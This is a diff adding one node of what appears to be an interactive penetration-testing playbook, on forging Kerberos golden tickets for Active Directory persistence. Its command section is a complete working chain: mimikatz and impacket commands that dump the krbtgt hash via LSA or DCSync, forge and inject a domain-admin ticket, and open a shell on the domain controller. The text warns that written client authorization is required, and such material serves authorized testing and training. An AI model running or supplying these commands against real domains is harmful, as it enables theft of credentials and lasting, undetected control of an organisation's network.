@@ -1,0 +1,38 @@
+{
+  "id": "golden_ticket",
+  "phase": "POST",
+  "title": "Golden Ticket — Forge TGTs with the krbtgt Hash (Domain Persistence)",
+  "body": "The KDC encrypts every TGT with the krbtgt account's password hash. If you steal krbtgt's hash, you can forge your OWN TGTs for ANY user with ANY group membership — and the DC will trust them because they're correctly encrypted. That's a golden ticket: arbitrary, self-minted domain-admin access that persists.\n\nGOLDEN vs SILVER:\n  - Silver ticket = forge a TGS for ONE service (needs that service account's hash). Limited.\n  - Golden ticket = forge a TGT (needs krbtgt's hash). Access to the ENTIRE domain.\n\nWHY IT'S PERSISTENCE GOLD:\n  - krbtgt's password is almost NEVER rotated. It only changes on a domain functional-level upgrade from pre-2008 — so old krbtgt hashes survive for years.\n  - Forging + injecting needs NO admin rights and can be done from a non-domain-joined box. You only needed admin ONCE, to grab the krbtgt hash.\n  - You can make a low-priv user (or any existing account) a Domain Admin in the forged ticket.\n\nPREREQUISITE — you must already own the domain to plant this:\n  Getting krbtgt's hash requires DA-level access first (DCSync, or dumping NTDS on the DC). Golden ticket is what you do AFTER popping the domain to KEEP access, not how you get in. It's a persistence/dominance technique.\n\nPOST-JULY-2022 CHANGE:\n  Microsoft tightened things — the /user you forge must now be an EXISTING account. Before, any made-up name worked. Use a real account (e.g. jen).\n\nKERBEROS GOTCHA (same as PsExec): after injecting the ticket, PsExec to the DC by HOSTNAME (\\\\DC1), not IP — IP forces NTLM and the forged Kerberos ticket won't apply.\n\nReal-engagement caution: a golden ticket is total domain compromise that survives password changes. Get explicit written client permission before planting one; many engagements scope persistence OUT entirely.",
+  "cmd": "# ══════════════════════════════════════════════════\n# STEP 1 — get krbtgt's NTLM hash (requires DA already)\n# ══════════════════════════════════════════════════\n# On the DC, or via DCSync from a DA-equivalent account:\nmimikatz # privilege::debug\nmimikatz # lsadump::lsa /patch\n#   ... RID 502 User: krbtgt  NTLM: 1693c6cefafffc7af11ef34d1c788f47\n# Also grab the domain SID (whoami /user, or from the dump).\n\n# DCSync alternative (from any DA-equivalent box, no DC login):\nmimikatz # lsadump::dcsync /user:krbtgt\n# or impacket:  impacket-secretsdump corp.com/da_user@dc1 -just-dc-user krbtgt\n\n# ══════════════════════════════════════════════════\n# STEP 2 — purge, then forge + inject the golden ticket\n# ══════════════════════════════════════════════════\nmimikatz # kerberos::purge       # clear existing tickets first\nmimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt\n#   /user   an EXISTING account (post-2022 requirement)\n#   /sid    the DOMAIN sid (no trailing RID)\n#   /krbtgt krbtgt's NTLM hash (NOT /rc4)\n#   /ptt    pass-the-ticket: inject straight into this session\n# Defaults bake in RID 500 + Domain Admins/Enterprise Admins group membership.\n\n# ══════════════════════════════════════════════════\n# STEP 3 — use it (hostname, not IP)\n# ══════════════════════════════════════════════════\nmimikatz # misc::cmd             # spawn a cmd that can see the ticket\nC:\\Tools\\SysinternalsSuite> PsExec.exe \\\\DC1 cmd.exe     # HOSTNAME -> Kerberos\n# whoami        -> corp\\jen\n# whoami /groups -> includes CORP\\Domain Admins, Enterprise Admins, Schema Admins\n\n# Contrast — IP forces NTLM and is denied even with the golden ticket:\n#   PsExec.exe \\\\192.168.50.70 cmd.exe   -> Access is denied\n\n# ══════════════════════════════════════════════════\n# FROM KALI — impacket\n# ══════════════════════════════════════════════════\nimpacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com jen\nexport KRB5CCNAME=jen.ccache\nimpacket-psexec -k -no-pass corp.com/jen@dc1.corp.com",
+  "warn": "A golden ticket is total, persistent domain compromise that survives user password changes (only a krbtgt reset kills it). This is a persistence technique requiring you ALREADY have DA to plant it — not an entry vector. On real engagements get explicit written authorization; persistence is often out of scope. Lab-only without it.",
+  "choices": [
+    {
+      "label": "How do I get krbtgt's hash? — DCSync",
+      "next": "dcsync"
+    },
+    {
+      "label": "Or dump it from NTDS — shadow copy",
+      "next": "shadow_copy_ntds"
+    },
+    {
+      "label": "Forge a single-service ticket instead — silver ticket",
+      "next": "silver_tickets"
+    },
+    {
+      "label": "Use the ticket — PsExec to the DC",
+      "next": "psexec_lateral"
+    },
+    {
+      "label": "Have a user hash, not krbtgt — overpass-the-hash",
+      "next": "overpass_the_hash"
+    },
+    {
+      "label": "Document the domain compromise",
+      "next": "doc_cred_access"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
